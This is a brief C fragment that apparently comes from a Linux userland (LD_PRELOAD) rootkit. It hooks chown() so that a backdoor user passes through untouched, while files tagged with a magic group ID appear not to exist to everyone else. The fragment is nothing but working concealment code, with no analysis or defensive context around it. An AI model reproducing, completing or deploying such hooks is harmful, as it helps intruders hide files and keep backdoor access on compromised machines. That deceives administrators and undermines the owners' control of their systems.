int chown(const char *pathname, uid_t owner, gid_t group)
{
    HOOK(o_chown,CCHOWN);
    if(is_bdusr()) return o_chown(pathname,owner,group);
    if(hxstat(pathname,MGID,32)) { errno=ENOENT; return -1; }
    return o_chown(pathname,owner,group);
}
